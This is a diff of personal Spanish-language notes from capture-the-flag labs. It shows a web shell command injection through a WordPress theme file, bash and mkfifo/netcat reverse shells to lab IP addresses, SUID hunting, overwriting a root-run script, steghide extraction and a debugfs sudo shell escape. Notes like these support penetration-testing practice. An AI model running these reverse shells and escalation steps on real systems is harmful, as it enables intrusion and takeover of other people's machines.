@@ -10,7 +10,8 @@ nc -nlvp 443
 http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261"
 script /dev/null -c bash 
 Escalada de privilegios
-
+Reverseshell desde una maquina a otra ojo en la misma red o ip este caso de una 172.18.0.2 a una 172.18.0.1
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 172.18.0.1 4444 > /tmp/f
 En el /etc/passwd no encontramos ningún usuario mario al que podamos migrar con las credenciales que ya tenemos. Tampoco podemos hacer "sudo -l. Buscaremos por binarios con permisos SUID desde la raíz:
 
 find / -perm -4000 2>/dev/null
@@ -85,3 +86,16 @@ enum4linux -a 172.17.0.2
 
 sobreescribe si no permite escribir con nao entre comillas el contenido > la ruta
 echo '#!/bin/bash' > /opt/log_cleaner.sh
+
+Para Imágenes (JPG, PNG, BMP)
+Steghide
+Extrae datos ocultos con/sin contraseña:
+bash# Instalar
+apt-get install steghide
+# Extraer sin contraseña
+steghide extract -sf imagen.jpg
+----------------------
+con debugfs 
+sudo -u ruben /usr/sbin/debugfs                                                                                                    
+debugfs:  !/bin/sh
+---------------------
